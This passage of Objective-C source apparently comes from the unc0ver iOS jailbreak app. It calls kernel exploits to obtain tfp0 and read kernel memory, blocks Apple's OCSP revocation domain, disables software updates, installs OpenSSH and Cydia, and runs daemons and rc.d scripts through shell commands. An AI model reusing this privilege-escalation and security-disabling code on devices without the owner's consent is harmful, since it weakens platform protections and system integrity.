        LOG("Successfully repaired filesystem.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.disable_app_revokes) {
            // Disable app revokes.
            LOG("Disabling app revokes...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable app revokes.", nil));
            blockDomainWithName("ocsp.apple.com");
            NSArray <NSString *> *array = @[@"/var/Keychains/ocspcache.sqlite3",
                                            @"/var/Keychains/ocspcache.sqlite3-shm",
                                            @"/var/Keychains/ocspcache.sqlite3-wal"];
            for (NSString *path in array) {
                ensure_symlink("/dev/null", path.UTF8String);
            }
            LOG("Successfully disabled app revokes.");
        } else {
            // Enable app revokes.
            LOG("Enabling app revokes...");
            SETMESSAGE(NSLocalizedString(@"Failed to enable app revokes.", nil));
            unblockDomainWithName("ocsp.apple.com");
            LOG("Successfully enabled app revokes.");
        }
    }
    
    UPSTAGE();
    
    {
        // Allow SpringBoard to show non-default system apps.
        
        LOG("Allowing SpringBoard to show non-default system apps...");
        SETMESSAGE(NSLocalizedString(@"Failed to allow SpringBoard to show non-default system apps.", nil));
        NSString *SpringBoardPreferencesFile = @"/var/mobile/Library/Preferences/com.apple.springboard.plist";
        NSString *SpringBoardShowNonDefaultSystemAppsKey = @"SBShowNonDefaultSystemApps";
        _assert(modifyPlist(SpringBoardPreferencesFile, ^(id plist) {
            plist[SpringBoardShowNonDefaultSystemAppsKey] = @YES;
        }), message, true);
        LOG("Successfully allowed SpringBoard to show non-default system apps.");
    }
    
    UPSTAGE();
    
    {
        // Fix Auto Updates.
        
        LOG("Fixing Auto Updates...");
        SETMESSAGE(NSLocalizedString(@"Failed to fix auto updates.", nil));
        if (access("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/softwareupdated", "/System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated") == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/softwareupdateservicesd", "/System/Library/PrivateFrameworks/SoftwareUpdateServices.framework/Support/softwareupdateservicesd") == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/com.apple.mobile.softwareupdated.plist", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/com.apple.mobile.softwareupdated.plist", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist") == ERR_SUCCESS, message, false);
            _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist", NULL) == ERR_SUCCESS, message, false);
        }
        if (access("/System/Library/com.apple.softwareupdateservicesd.plist", F_OK) == ERR_SUCCESS) {
            _assert(rename("/System/Library/com.apple.softwareupdateservicesd.plist", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist") == ERR_SUCCESS, message, false);
            _assert(runCommand("/bin/launchctl", "load", "/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist", NULL) == ERR_SUCCESS, message, false);
        }
        LOG("Successfully fixed Auto Updates.");
    }
    
    UPSTAGE();
    
    {
        NSArray <NSString *> *array = @[@"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate",
                           @"/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdateDocumentation",
                           @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdate",
                           @"/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SoftwareUpdateDocumentation"];
        if (prefs.disable_auto_updates) {
            // Disable Auto Updates.
            
            LOG("Disabling Auto Updates...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable auto updates.", nil));
            for (NSString *path in array) {
                ensure_symlink("/dev/null", path.UTF8String);
            }
            LOG("Successfully disabled Auto Updates.");
        } else {
            // Enable Auto Updates.
            
            LOG("Enabling Auto Updates...");
            SETMESSAGE(NSLocalizedString(@"Failed to enable auto updates.", nil));
            for (NSString *path in array) {
                ensure_directory(path.UTF8String, 0, 0755);
            }
        }
    }
    
    UPSTAGE();
    
    {
        char *targettype = NULL;
        size_t size = 0;
        _assert(sysctlbyname("hw.targettype", NULL, &size, NULL, 0) == ERR_SUCCESS, message, true);
        targettype = malloc(size);
        _assert(targettype != NULL, message, true);
        _assert(sysctlbyname("hw.targettype", targettype, &size, NULL, 0) == ERR_SUCCESS, message, true);
        NSString *jetsamFile = [NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", targettype];
        free(targettype);
        targettype = NULL;
        if (prefs.increase_memory_limit) {
            // Increase memory limit.
            
            LOG("Increasing memory limit...");
            SETMESSAGE(NSLocalizedString(@"Failed to increase memory limit.", nil));
            _assert(modifyPlist(jetsamFile, ^(id plist) {
                plist[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = [NSNumber numberWithInteger:[plist[@"Version4"][@"PListDevice"][@"MemoryCapacity"] integerValue]];
            }), message, true);
            LOG("Successfully increased memory limit.");
        } else {
            // Restored memory limit.
            
            LOG("Restoring memory limit...");
            SETMESSAGE(NSLocalizedString(@"Failed to restore memory limit.", nil));
            _assert(modifyPlist(jetsamFile, ^(id plist) {
                plist[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = nil;
            }), message, true);
            LOG("Successfully restored memory limit.");
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.install_openssh) {
            // Install OpenSSH.
            LOG("Installing OpenSSH...");
            SETMESSAGE(NSLocalizedString(@"Failed to install OpenSSH.", nil));
            if (debIsConfigured("openssl") &&
                compareInstalledVersion("openssl", "lt", "1.0.2q")) {
                _assert(removePkg("openssl", true), message, false);
            }
            _assert(installDebs(@[@"openssh.deb", @"openssl.deb", @"ca-certificates.deb"], false), message, false);
            LOG("Successfully installed OpenSSH.");
            
            // Disable Install OpenSSH.
            LOG("Disabling Install OpenSSH...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable Install OpenSSH.", nil));
            prefs.install_openssh = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_INSTALL_OPENSSH] = @NO;
            }), message, true);
            LOG("Successfully disabled Install OpenSSH.");
        }
    }
    
    UPSTAGE();
    
    {
        if (debIsInstalled("cydia-gui")) {
            // Remove Electra's Cydia.
            LOG("Removing Electra's Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to remove Electra's Cydia.", nil));
            _assert(removePkg("cydia-gui", true), message, true);
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully removed Electra's Cydia.");
        }
        if (access("/etc/apt/sources.list.d/sileo.sources", F_OK) == ERR_SUCCESS) {
            // Remove Electra's Sileo - it has trigger loops and incompatible depends
            LOG("Removing Incompatible Sileo...");
            SETMESSAGE(NSLocalizedString(@"Failed to remove incompatible Sileo.", nil));

            if (debIsInstalled("org.coolstar.sileo")) {
                _assert(removePkg("org.coolstar.sileo", true), message, true);
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true); // barf
            }
            clean_file("/etc/apt/sources.list.d/sileo.sources");
        }
        if (debIsInstalled("cydia-upgrade-helper")) {
            // Remove Electra's Cydia Upgrade Helper.
            LOG("Removing Electra's Cydia Upgrade Helper...");
            SETMESSAGE(NSLocalizedString(@"Failed to remove Electra's Cydia Upgrade Helper.", nil));
            _assert(removePkg("cydia-upgrade-helper", true), message, false);
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully removed Electra's Cydia Upgrade Helper.");
        }
        if (access("/etc/apt/sources.list.d/electra.list", F_OK) == ERR_SUCCESS) {
            if (!prefs.install_cydia) {
                prefs.install_cydia = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_INSTALL_CYDIA] = @YES;
                }), message, true);
            }
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
        }
        // Unblock Saurik's repo if it is blocked.
        unblockDomainWithName("apt.saurik.com");
        if (prefs.install_cydia) {
            // Install Cydia.
            
            LOG("Installing Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to install Cydia.", nil));
            // Force depends because Sileo breaks this with depending "newer" Cydia
            _assert(installDebs(@[@"cydia.deb", @"cydia-lproj.deb"], true), message, true);
            LOG("Successfully installed Cydia.");
            
            // Disable Install Cydia.
            LOG("Disabling Install Cydia...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable Install Cydia.", nil));
            prefs.install_cydia = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_INSTALL_CYDIA] = @NO;
            }), message, true);
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
            LOG("Successfully disabled Install Cydia.");
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.load_daemons) {
            // Load Daemons.
            
            LOG("Loading Daemons...");
            SETMESSAGE(NSLocalizedString(@"Failed to load Daemons.", nil));
            system("echo 'really jailbroken';"
                    "shopt -s nullglob;"
                    "for a in /Library/LaunchDaemons/*.plist;"
                        "do echo loading $a;"
                        "launchctl load \"$a\" ;"
                    "done; ");
            system("for file in /etc/rc.d/*; do "
                        "if [[ -x \"$file\" ]]; then "
                            "\"$file\";"
                         "fi;"
                    "done");
            LOG("Successfully loaded Daemons.");
        }
    }

    UPSTAGE();
    
    {
        if (prefs.run_uicache) {
            // Run uicache.
            
            LOG("Running uicache...");
            SETMESSAGE(NSLocalizedString(@"Failed to run uicache.", nil));
            _assert(runCommand("/usr/bin/uicache", NULL) == ERR_SUCCESS, message, true);
            prefs.run_uicache = false;
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_REFRESH_ICON_CACHE] = @NO;
            }), message, true);
            LOG("Successfully ran uicache.");
        }
    }
    
    UPSTAGE();
    
    {
        // Flush preference cache.
        
        LOG("Flushing preference cache...");
        SETMESSAGE(NSLocalizedString(@"Failed to flush preference cache.", nil));
        _assert(runCommand("/bin/launchctl", "stop", "com.apple.cfprefsd.xpc.daemon", NULL) == ERR_SUCCESS, message, true);
        LOG("Successfully flushed preference cache.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.load_tweaks) {
            // Load Tweaks.
            
            LOG("Loading Tweaks...");
            SETMESSAGE(NSLocalizedString(@"Failed to run ldrestart", nil));
            if (prefs.reload_system_daemons) {
                rv = system("nohup bash -c \""
                             "launchctl unload /System/Library/LaunchDaemons/com.apple.backboardd.plist && "
                             "ldrestart ;"
                             "launchctl load /System/Library/LaunchDaemons/com.apple.backboardd.plist"
                             "\" 2>&1 >/dev/null &");
            } else {
                rv = system("launchctl stop com.apple.backboardd");
            }
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            LOG("Successfully loaded Tweaks.");
        }
    }
}

- (IBAction)tappedOnJailbreak:(id)sender
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
        bool exploit_success = false;
        _assert(bundledResources != nil, NSLocalizedString(@"Bundled Resources version missing.", nil), true);
        if (!jailbreakSupported()) {
            STATUS(NSLocalizedString(@"Unsupported", nil), false, true);
            return;
        }
        UPSTAGE();
        // Initialize kernel exploit.
        LOG("Initializing kernel exploit...");
        mach_port_t persisted_port = try_restore_port();
        if (MACH_PORT_VALID(persisted_port)) {
            offsets_init();
            prepare_for_rw_with_fake_tfp0(persisted_port);
            exploit_success = true;
        } else {
            switch ([[NSUserDefaults standardUserDefaults] integerForKey:K_EXPLOIT]) {
                case empty_list_exploit: {
                    exploit_success = vfs_sploit();
                    break;
                }
                    
                case multi_path_exploit: {
                    exploit_success = mptcp_go();
                    break;
                }
                case async_wake_exploit: {
                    exploit_success = async_wake_go();
                    break;
                }
                    
                default: {
                    NOTICE(NSLocalizedString(@"No exploit selected", nil), false, false);
                    STATUS(NSLocalizedString(@"Jailbreak", nil), true, true);
                    return;
                    break;
                }
            }
            if (exploit_success && !MACH_PORT_VALID(tfp0)) {
                LOG(@"Exploit returned success but tfp0 is invalid");
                exploit_success = false;
            }
        }
        
        if (exploit_success) {
            LOG("TFP0 Obtained");
        } else if (restartSupported()) {
            NOTICE(NSLocalizedString(@"Kernel exploit failed. This is not an error. Tap OK to reboot and try again.", nil), true, false);
            NSInteger support = recommendedRestartSupport();
            _assert(support != -1, message, true);
            switch (support) {
                case necp_exploit: {
                    necp_die();
                    break;
                }
                default:
                    break;
            }
            exit(EXIT_FAILURE);
        } else {
            NOTICE(NSLocalizedString(@"Kernel exploit failed. This is not an error. Reboot and try again.", nil), true, false);
            exit(EXIT_FAILURE);
        }
        kernel_base = (uint64_t)get_kernel_base();
        LOG("kernel_base = "ADDR"", kernel_base);
        _assert(ISADDR(kernel_base), message, true);
        uint32_t kernel_magic = ReadKernel32(kernel_base);
        LOG("kernel_magic = 0x%x", kernel_magic);
        _assert(kernel_magic == MACH_HEADER_MAGIC, message, true);
        kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS);
        LOG("kernel_slide = "ADDR"", kernel_slide);
        _assert(ISADDR(kernel_slide), message, true);
        exploit();
        STATUS(NSLocalizedString(@"Jailbroken", nil), false, false);
    });
}

+ (NSURL *)getURLForUserName:(NSString *)userName {
    if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetbot://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetbot:///user_profile/%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitterrific://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"twitterrific:///profile?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetings://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetings:///user?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitter://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    } else {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    sharedController = self;
    bundledResources = bundledResourcesVersion();
    LOG("unc0ver Version: %@", appVersion());
    LOG("Bundled Resources Version: %@", bundledResources);
    if (jailbreakEnabled()) {
        STATUS(NSLocalizedString(@"Re-Jailbreak", nil), true, true);
    } else if (!jailbreakSupported()) {
        STATUS(NSLocalizedString(@"Unsupported", nil), false, true);
    }
    if (bundledResources == nil) {
        showAlert(NSLocalizedString(@"Error", nil), NSLocalizedString(@"Bundled Resources version is missing. This build is invalid.", nil), false, false);
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleDefault;
}

- (IBAction)tappedOnPwn:(id)sender{
    [[UIApplication sharedApplication] openURL:[JailbreakViewController getURLForUserName:@"Pwn20wnd"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnDennis:(id)sender{
    [[UIApplication sharedApplication] openURL:[JailbreakViewController getURLForUserName:@"DennisBednarz"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamB:(id)sender{
    [[UIApplication sharedApplication] openURL:[JailbreakViewController getURLForUserName:@"sbingner"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamG:(id)sender{
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://reddit.com/u/Samg_is_a_Ninja"] options:@{} completionHandler:nil];
}

// This intentionally returns nil if called before it's been created by a proper init
+(JailbreakViewController *)sharedController {
    return sharedController;
}

-(void)appendTextToOutput:(NSString *)text {
    static NSRegularExpression *remove = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        remove = [NSRegularExpression regularExpressionWithPattern:@"^\\d{4}-\\d{2}-\\d{2}\\s\\d{2}:\\d{2}:\\d{2}\\.\\d+[-\\d\\s]+\\S+\\[\\d+:\\d+\\]\\s+"
                                                           options:NSRegularExpressionAnchorsMatchLines error:nil];
        output = [NSMutableString new];
    });
    
    text = [remove stringByReplacingMatchesInString:text options:0 range:NSMakeRange(0, text.length) withTemplate:@""];

    @synchronized (output) {
        [output appendString:text];
        dispatch_async(dispatch_get_main_queue(), ^{
                self.outputView.text = output;
                [self.outputView scrollRangeToVisible:NSMakeRange(output.length - 1, 1)];
        });
    }
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithCoder:aDecoder];
        }
    }
    self = sharedController;
    return self;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
        }
    }
    self = sharedController;
    return self;
}

- (id)init {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super init];
        }
    }
    self = sharedController;
    return self;
}

@end

// Don't move this - it is at the bottom so that it will list the total number of upstages
int maxStage = __COUNTER__ - 1;
